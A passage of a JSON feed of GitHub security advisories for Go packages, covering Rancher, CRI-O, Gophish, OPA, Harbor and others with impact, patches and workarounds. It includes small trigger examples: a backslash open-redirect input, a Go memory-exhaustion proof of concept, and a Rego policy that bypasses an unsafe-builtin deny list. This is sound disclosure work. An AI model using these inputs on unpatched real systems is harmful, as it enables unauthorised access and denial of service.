exposure of Rancher's `serviceAccountToken` allows any standard user to escalate its privileges to cluster administrator in Rancher.\n- For the exposure of credentials not related to Rancher, the final impact severity for confidentiality, integrity and availability is dependent on the permissions that the leaked credentials have on their own services.\n\nThe fields that have been addressed by this security fix are:\n\n- `Notifier.SMTPConfig.Password`\n- `Notifier.WechatConfig.Secret`\n- `Notifier.DingtalkConfig.Secret`\n- `Catalog.Spec.Password`\n- `SourceCodeProviderConfig.GithubPipelineConfig.ClientSecret`\n- `SourceCodeProviderConfig.GitlabPipelineConfig.ClientSecret`\n- `SourceCodeProviderConfig.BitbucketCloudPipelineConfig.ClientSecret`\n- `SourceCodeProviderConfig.BitbucketServerPipelineConfig.PrivateKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.BackupConfig.S3BackupConfig.SecretKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.WeaveNetworkProvider.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.Global.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.VirtualCenter.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.OpenstackCloudProvider.Global.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientSecret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientCertPassword`\n- `Cluster.Status.ServiceAccountToken`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.PrivateRegistries.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.Network.WeaveNetworkProvider.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.Global.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.VirtualCenter.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.OpenstackCloudProvider.Global.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientSecret`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientCertPassword`\n\n### Patches\nPatched versions include releases 2.5.16, 2.6.7 and later versions.\n\nAfter upgrading to a patched version, it is important to check for the `SecretsMigrated` condition on `Clusters`, `ClusterTemplates`, and `Catalogs` to confirm when secrets have been fully migrated off of those objects and the objects scoped within them (`Notifiers` and `SourceCodeProviderConfigs`).\n\n### Workarounds\nLimit access in Rancher to trusted users. There is not a direct mitigation besides upgrading to the patched Rancher versions.\n\n**Important:**\n- It is highly advised to rotate Rancher's `serviceAccountToken`. This rotation is not done by the version upgrade. Please see the helper script below.\n- The local and downstream clusters should be checked for potential unrecognized services (pods), users and API keys.\n- It is recommended to review for potential leaked credentials in this scenario, that are not directly related to Rancher, and to change them if deemed necessary.\n\nThe script available in [rancherlabs/support-tools/rotate-tokens](https://github.com/rancherlabs/support-tools/blob/master/rotate-tokens) repository can be used as a helper to rotate the service account token (used to provision clusters). The script requires a valid Rancher API token, `kubectl` access to the `local` cluster and the `jq` command.\n\n### Credits\nWe would like to recognize and appreciate Florian Struck (from [Continum AG](https://www.continum.net/)) and [Marco Stuurman](https://github.com/fe-ax) (from [Shock Media B.V.](https://www.shockmedia.nl)) for the responsible disclosure of this security issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-g7j7-h4q8-8w2f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36782"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1193988"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-312"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-23T18:11:28Z", "nvd_published_at": "2022-09-07T09:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-phjr-8j92-w5v7", "modified": "2022-09-22T17:22:56Z", "published": "2022-09-20T00:00:22Z", "aliases": ["CVE-2022-2995"], "summary": "CRI-O incorrect handling of supplementary groups may lead to sensitive information disclosure", "details": "Incorrect handling of the supplementary groups in the CRI-O container engine might lead to sensitive information disclosure or possible data modification if an attacker has direct access to the affected container where supplementary groups are used to set access permissions and is able to execute a binary code in that container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.25.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2995"}, {"type": "WEB", "url": "https://github.com/cri-o/cri-o/pull/6159"}, {"type": "WEB", "url": "https://github.com/cri-o/cri-o/commit/db3b399a8d7dabf7f073db73894bee98311d7909"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}, {"type": "WEB", "url": "https://www.benthamsgaze.org/2022/08/22/vulnerability-in-linux-containers-investigation-and-mitigation/"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-21T17:46:18Z", "nvd_published_at": "2022-09-19T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hvw3-p9px-gpc9", "modified": "2022-09-16T22:02:43Z", "published": "2022-09-12T00:00:33Z", "aliases": ["CVE-2022-25295"], "summary": "Gophish before 0.12.0 vulnerable to Open Redirect", "details": "This affects the package github.com/gophish/gophish before 0.12.0. The Open Redirect vulnerability exists in the next query parameter. The application uses url.Parse(r.FormValue(\"next\")) to extract path and eventually redirect user to a relative URL, but if next parameter starts with multiple backslashes like \\\\\\\\\\\\example.com, browser will redirect user to http://example.com.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gophish/gophish"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25295"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/pull/2262"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/commit/2a452bda89ffdb85f929fa78290bce1f456881dc"}, {"type": "PACKAGE", "url": "https://github.com/gophish/gophish"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/releases/tag/v0.12.0"}, {"type": "WEB", "url": "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOPHISHGOPHISH-2404177"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:28:46Z", "nvd_published_at": "2022-09-11T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xwf3-6rgv-939r", "modified": "2022-09-01T22:15:35Z", "published": "2022-09-01T22:15:35Z", "aliases": ["CVE-2022-36035"], "summary": "Flux CLI Workload Injection", "details": "Flux CLI allows users to deploy Flux components into a Kubernetes cluster via command-line. The vulnerability allows other applications to replace the Flux deployment information with arbitrary content which is deployed into the target Kubernetes cluster instead.\n\nThe vulnerability is due to the improper handling of user-supplied input, which results in a path traversal that can be controlled by the attacker.\n\n### Impact\nUsers sharing the same shell between other applications and the Flux CLI commands could be affected by this vulnerability.\n\nIn some scenarios no errors may be presented, which may cause end users not to realise that something is amiss.\n\n### Workarounds\n\nA safe workaround is to execute Flux CLI in ephemeral and isolated shell environments, which can ensure no persistent values exist from previous processes. However, upgrading to the latest version of the CLI is still the recommended mitigation strategy.\n\n### Credits\nThe Flux engineering team found and patched this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n- Open an issue in any of the affected repositories.\n- Contact us at the CNCF Flux Channel.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/flux2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.21.0"}, {"fixed": "0.32.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/flux2/security/advisories/GHSA-xwf3-6rgv-939r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36035"}, {"type": "PACKAGE", "url": "https://github.com/fluxcd/flux2"}, {"type": "WEB", "url": "https://github.com/fluxcd/flux2/releases/tag/v0.32.0"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-01T22:15:35Z", "nvd_published_at": "2022-08-31T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r947-2crg-xc39", "modified": "2022-09-19T20:19:16Z", "published": "2022-09-15T00:00:17Z", "aliases": ["CVE-2022-40365"], "summary": "ouqiang gocron Cross-site scripting vulnerability", "details": "Cross site scripting (XSS) vulnerability in ouqiang gocron through 1.5.3, allows attackers to execute arbitrary code via scope.row.hostname in web/vue/src/pages/taskLog/list.vue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ouqiang/gocron"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.5.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40365"}, {"type": "WEB", "url": "https://github.com/ouqiang/gocron/issues/362"}, {"type": "PACKAGE", "url": "https://github.com/ouqiang/gocron"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:09:07Z", "nvd_published_at": "2022-09-14T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mv8x-668m-53fg", "modified": "2022-09-16T21:21:43Z", "published": "2022-09-16T21:21:43Z", "aliases": ["CVE-2022-36061"], "summary": "Elrond-go has improper initialization", "details": "### Impact\nRead only calls between contracts can generate smart contracts results. For example, if contract A calls in read only mode contract B and the called function will make changes upon the contract's B state, the state will be altered for contract B as if the call was not made in the read-only mode. This can lead to some effects not designed by the original smart contracts programmers.\n\n### Patches\nPatch v1.3.35 or higher\n\n### Workarounds\nNo workaround\n\n### References\nFor future reference and understanding of this issue, anyone can check this integration test https://github.com/ElrondNetwork/elrond-go/blob/8e402fa6d7e91e779980122d3798b2bf50892945/integrationTests/vm/txsFee/asyncESDT_test.go#L452 that proves the fix and prevents a future code regression. \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in elrond-go ([http://github.com/ElrondNetwork/elrond-go/issues](https://github.com/ElrondNetwork/elrond-go/issues))\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ElrondNetwork/elrond-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.35"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.3.34"}}], "references": [{"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/security/advisories/GHSA-mv8x-668m-53fg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36061"}, {"type": "PACKAGE", "url": "https://github.com/ElrondNetwork/elrond-go"}, {"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/blob/8e402fa6d7e91e779980122d3798b2bf50892945/integrationTests/vm/txsFee/asyncESDT_test.go#L452"}, {"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/releases/tag/v1.3.35"}], "database_specific": {"cwe_ids": ["CWE-665"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-16T21:21:43Z", "nvd_published_at": "2022-09-06T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9vm3-r8gq-cr6x", "modified": "2022-09-16T22:00:39Z", "published": "2022-09-10T00:00:23Z", "aliases": ["CVE-2022-38638"], "summary": "Casdoor arbitrary file write vulnerability", "details": "Casdoor v1.97.3 was discovered to contain an arbitrary file write vulnerability via the fullFilePath parameter at /api/upload-resource.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/casdoor/casdoor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.103.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38638"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/issues/1035"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/issues/1063"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/commit/411d76798d73446fff4a0244f0475f1ea8bf42dc"}, {"type": "PACKAGE", "url": "https://github.com/casdoor/casdoor"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/releases/tag/v1.103.1"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:32:58Z", "nvd_published_at": "2022-09-09T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c9qr-f6c8-rgxf", "modified": "2022-09-30T23:07:07Z", "published": "2022-09-29T00:00:26Z", "aliases": ["CVE-2022-40082"], "summary": "Hertz contains path traversal via normalizePath function", "details": "Hertz is a a high-performance and strong-extensibility Go HTTP framework that helps developers build microservices. Versions of Hertz prior to 0.3.1 contain a path traversal vulnerability via the normalizePath function. This issue has been patched in 0.3.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudwego/hertz"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40082"}, {"type": "WEB", "url": "https://github.com/cloudwego/hertz/issues/228"}, {"type": "WEB", "url": "https://github.com/cloudwego/hertz/pull/229"}, {"type": "PACKAGE", "url": "https://github.com/cloudwego/hertz"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1027"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-30T23:07:07Z", "nvd_published_at": "2022-09-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4p6f-m4f9-ch88", "modified": "2022-09-16T21:25:03Z", "published": "2022-09-16T21:25:03Z", "aliases": ["CVE-2022-36078"], "summary": "Binary vulnerable to Slice Memory Allocation with Excessive Size Value", "details": "### Impact\n> _What kind of vulnerability is it? Who is impacted?_\n\nThe vulnerability is a memory allocation vulnerability that can be exploited to allocate slices in memory with (arbitrary) excessive size value, which can either exhaust available memory or crash the whole program.\n\nWhen using `github.com/gagliardetto/binary` to parse unchecked (or wrong type of) data from untrusted sources of input (e.g. the blockchain) into slices, it's possible to allocate memory with excessive size.\n\nWhen `dec.Decode(&val)` method is used to parse data into a structure that is or contains slices of values, the length of the slice was previously read directly from the data itself without any checks on the size of it, and then a slice was allocated. This could lead to an overflow and an allocation of memory with excessive size value.\n\nExample:\n\n```go\npackage main\n\nimport (\n\t\"github.com/gagliardetto/binary\" // any version before v0.7.1 is vulnerable\n\t\"log\"\n)\n\ntype MyStruct struct {\n\tField1 []byte // field is a slice (could be a slice of any type)\n}\n\nfunc main() {\n\t// Let's assume that the data is coming from the blockchain:\n\tdata := []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10}\n\t\n\tvar val MyStruct\n\t// - To determine the size of the val.Field1 slice, the decoder will read the length\n\t//   of the slice from the data itself without any checks on the size of it.\n\t//\n\t// - This could lead to an allocation of memory with excessive size value.\n\t//   Which means: []byte{0x01, 0x02, 0x03, 0x04} will be read as the length\n\t//   of the slice (= 67305985) and then an allocation of memory with 67305985 bytes will be made.\n\t//\n\tdec := binary.NewBorshDecoder(data)\n\terr := dec.Decode(&val)  // or binary.UnmarshalBorsh(&val, data) or binary.UnmarshalBin(&val, data) etc.\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n```\n\n### Patches\n> _Has the problem been patched? What versions should users upgrade to?_\n\nThe vulnerability has been patched in `github.com/gagliardetto/binary` `v0.7.1`\n\nUsers should upgrade to `v0.7.1` or higher.\n\nTo upgrade to `v0.7.1` or higher, run:\n\n```bash\ngo get github.com/gagliardetto/binary@v0.7.1\n\n# or\n\ngo get github.com/gagliardetto/binary@latest\n```\n\n### Workarounds\n> _Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nA workaround is not to rely on the `dec.Decode(&val)` function to parse the data, but to use a custom `UnmarshalWithDecoder()` method that reads and checks the length of any slice.\n\n### References\n> _Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/gagliardetto/binary](https://github.com/gagliardetto/binary)\n* DM me on [twitter](https://twitter.com/immaterial_ink)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gagliardetto/binary"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gagliardetto/binary/security/advisories/GHSA-4p6f-m4f9-ch88"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36078"}, {"type": "WEB", "url": "https://github.com/gagliardetto/binary/pull/7"}, {"type": "PACKAGE", "url": "https://github.com/gagliardetto/binary"}, {"type": "WEB", "url": "https://github.com/gagliardetto/binary/releases/tag/v0.7.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0963"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-789"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T21:25:03Z", "nvd_published_at": "2022-09-02T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f524-rf33-2jjr", "modified": "2023-02-15T19:25:47Z", "published": "2022-09-16T17:42:47Z", "aliases": ["CVE-2022-36085"], "summary": "OPA Compiler: Bypass of WithUnsafeBuiltins using \"with\" keyword to mock functions", "details": "### Impact\n\nThe Rego compiler provides a (deprecated) `WithUnsafeBuiltins` function, which allows users to provide a set of built-in functions that should be deemed unsafe \u2014 and as such rejected \u2014 by the compiler if encountered in the policy compilation stage. A bypass of this protection has been found, where the use of the `with` keyword to mock such a built-in function (a feature introduced in OPA v0.40.0), isn\u2019t taken into account by `WithUnsafeBuiltins`.\n\nThe same method is exposed via `rego.UnsafeBuiltins` in the `github.com/open-policy-agent/opa/rego` package.\n\nWhen provided e.g. the `http.send` built-in function to `WithUnsafeBuiltins`, the following policy would still compile, and call the `http.send` function with the arguments provided to the `is_object` function when evaluated:\n\n```rego\npackage policy\n\nfoo := is_object({\n    \"method\": \"get\", \n    \"url\": \"https://www.openpolicyagent.org\"\n})\n\nallow := r {\n    r := foo with is_object as http.send\n}\n```\n\nBoth built-in functions and user provided (i.e. custom) functions are mockable using this construct.\n\nIn addition to `http.send`, the `opa.runtime` built-in function is commonly considered unsafe in integrations where policy provided by untrusted parties is evaluated, as it risks exposing configuration, or environment variables, potentially carrying sensitive information.\n\n#### Affected Users\n\n**All of these conditions have to be met** to create an adverse effect:\n\n* Use the Go API for policy evaluation (not the OPA server, or the Go SDK)\n* Make use of the `WithUnsafeBuiltins` method in order to deny certain built-in functions, like e.g. `http.send`, from being used in policy evaluation.\n* Allow policy evaluation of policies provided by untrusted parties.\n* The policies evaluated include the `with` keyword to rewrite/mock a built-in, or custom, function to that of another built-in function, such as `http.send`.\n\n**Additionally, the OPA Query API** is affected:\n* If the OPA [Query API](https://www.openpolicyagent.org/docs/latest/rest-api/#query-api) is exposed to the public, and it is relied on `http.send` to be unavailable in that context. Exposing the OPA API to the public without proper [authentication and authorization](https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization) in place is generally advised against.\n\n### Patches\nv0.43.1, v0.44.0\n\n### Workarounds\n\nThe `WithUnsafeBuiltins`  function has been considered deprecated since the introduction of the [capabilities](https://www.openpolicyagent.org/docs/latest/deployments/#capabilities) feature in OPA v0.23.0 . While the function was commented as deprecated, the format of the comment was however not following the [convention](https://zchee.github.io/golang-wiki/Deprecated/) for deprecated functions, and might not have been picked up by tooling like editors. This has now been fixed. Users are still encouraged to use the capabilities feature over the deprecated `WithUnsafeBuiltins` function.\n\n**If you cannot upgrade**, consider using capabilities instead:\n\nCode like this using the `github.com/open-policy-agent/opa/ast` package:\n```go\n// VULNERABLE with OPA <= 0.43.0\nunsafeBuiltins := map[string]struct{}{\n\tast.HTTPSend.Name: struct{}{},\n}\ncompiler := ast.NewCompiler().WithUnsafeBuiltins(unsafeBuiltins)\n```\n\nneeds to be changed to this:\n```go\ncaps := ast.CapabilitiesForThisVersion()\nvar j int\nfor i, bi := range caps.Builtins {\n\tif bi.Name == ast.HTTPSend.Name {\n\t\tj = i\n\t\tbreak\n\t}\n}\ncaps.Builtins[j] = caps.Builtins[len(caps.Builtins)-1] // put last element into position j\ncaps.Builtins = caps.Builtins[:len(caps.Builtins)-1]   // truncate slice\n\ncompiler := ast.NewCompiler().WithCapabilities(caps)\n```\n\nWhen using the `github.com/open-policy-agent/opa/rego` package:\n\n```go\n// VULNERABLE with OPA <= 0.43.0\nr := rego.New(\n\t// other options omitted\n\trego.UnsafeBuiltins(map[string]struct{}{ast.HTTPSend.Name: struct{}{}}),\n)\n```\n\nneeds to be changed to\n```go\nr := rego.New(\n\t// other options omitted\n\trego.Capabilities(caps),\n)\n```\nwith `caps` defined above.\n\nNote that in the process, some error messages will change: `http.send` in this example will no longer be \"unsafe\" and thus forbidden, but it will simply become an \"unknown function\".\n\n### References\n\n* Fix commit on `main`: https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823\n* Fix commit in 0.43.1 release: https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8, release page for 0.43.1: https://github.com/open-policy-agent/opa/releases/tag/v0.43.1\n* Function mocking feature introduced in https://github.com/open-policy-agent/opa/pull/4540 and https://github.com/open-policy-agent/opa/pull/4616 \n* Documentation on the [capabilities](https://www.openpolicyagent.org/docs/latest/deployments/#capabilities) feature, which is the preferred way of providing a list of allowed built-in functions. The capabilities feature is **not** affected by this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Community Discussions](https://github.com/open-policy-agent/community/discussions/categories/opa-and-rego)\n* Ask in Slack: https://slack.openpolicyagent.org/\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/open-policy-agent/opa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.40.0"}, {"fixed": "0.43.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/open-policy-agent/opa/security/advisories/GHSA-f524-rf33-2jjr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36085"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/pull/4540"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/pull/4616"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8"}, {"type": "PACKAGE", "url": "https://github.com/open-policy-agent/opa"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/releases/tag/v0.43.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0978"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:42:47Z", "nvd_published_at": "2022-09-08T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fg25-gq9g-32mx", "modified": "2022-09-23T18:10:51Z", "published": "2022-09-21T00:00:44Z", "aliases": ["CVE-2022-32167"], "summary": "Cross site scripting in Cloudreve", "details": "Cloudreve versions v1.0.0 through v3.5.3 are vulnerable to Stored Cross-Site Scripting (XSS), via the file upload functionality. A low privileged user will be able to share a file with an admin user, which could lead to privilege escalation.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/HFO4/cloudreve"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"last_affected": "2.0.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cloudreve/Cloudreve/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.6.0-beta1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32167"}, {"type": "WEB", "url": "https://github.com/cloudreve/Cloudreve/commit/4b85541d73949969f41ad46d1e00544c9f1a7538"}, {"type": "PACKAGE", "url": "https://github.com/cloudreve/Cloudreve"}, {"type": "WEB", "url": "https://github.com/cloudreve/Cloudreve/releases/tag/3.6.0-beta1"}, {"type": "WEB", "url": "https://www.mend.io/vulnerability-database/CVE-2022-32167"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-23T18:10:51Z", "nvd_published_at": "2022-09-20T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xx9w-464f-7h6f", "modified": "2023-04-03T18:56:08Z", "published": "2022-09-16T20:27:13Z", "aliases": ["CVE-2022-31667"], "summary": " Harbor fails to validate the user permissions when updating a robot account", "details": "### Impact\nHarbor fails to validate the user permissions when updating a robot account that\nbelongs to a project that the authenticated user doesn\u2019t have access to. API call:\n\nPUT /robots/{robot_id}\n\nBy sending a request that attempts to update a robot account, and specifying a robot\naccount id and robot account name that belongs to a different project that the user\ndoesn\u2019t have access to, it was possible to revoke the robot account permissions.\n\n### Patches\nThis and similar issues are fixed in Harbor v2.5.2 and later. Please upgrade as soon as possible.\n\n### Workarounds\nThere are no workarounds available.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Harbor GitHub repository](https://github.com/goharbor/harbor)\n\n### Credits\nThanks to [Gal Goldstein](https://www.linkedin.com/in/gal-goldshtein/) and [Daniel Abeles](https://www.linkedin.com/in/daniel-abeles/) from [Oxeye Security](https://www.oxeye.io/) for reporting this issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.10.13"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.12"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.4.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-xx9w-464f-7h6f"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": 